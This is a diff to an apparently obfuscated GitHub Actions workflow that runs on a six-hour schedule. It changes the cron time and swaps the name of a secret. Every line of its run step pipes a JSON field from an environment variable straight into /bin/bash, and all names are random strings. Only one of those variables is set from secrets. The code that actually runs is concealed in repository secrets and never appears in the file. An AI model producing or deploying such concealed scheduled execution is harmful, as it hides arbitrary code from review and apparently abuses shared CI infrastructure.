@@ -3,23 +3,26 @@ name: jiangjing19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 0/6 * * *'
+    - cron: '5 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiangjing19871010
         env:
-          emqpq01400: ${{ secrets.emqpq01400 }}
+          xtjxw4: ${{ secrets.xtjxw4 }}
         run: |
-          echo $emqpq01400 | jq -r .t867 | /bin/bash
-          echo $rwfx8349 | jq -r .vf367 | /bin/bash
-          echo $zftj244 | jq -r .xk3 | /bin/bash
-          echo $zf15 | jq -r .qy310 | /bin/bash
-          echo $fu792 | jq -r .vp4714 | /bin/bash
-          echo $sr45 | jq -r .g5 | /bin/bash
-          echo $kpf3 | jq -r .mfgp0744 | /bin/bash
-          echo $pfdo39122 | jq -r .p3 | /bin/bash
+          echo $xtjxw4 | jq -r .fh59 | /bin/bash
+          echo $tg0 | jq -r .fdzn47 | /bin/bash
+          echo $saqj6955 | jq -r .ucn1 | /bin/bash
+          echo $io5328 | jq -r .fjt994 | /bin/bash
+          echo $ygol5 | jq -r .oj0792 | /bin/bash
+          echo $flr246 | jq -r .rr5699 | /bin/bash
+          echo $nn11811 | jq -r .rg5 | /bin/bash
+          echo $gbc170 | jq -r .j414 | /bin/bash
+          echo $dwzye2 | jq -r .o77 | /bin/bash
+          echo $vb34 | jq -r .y2 | /bin/bash
 
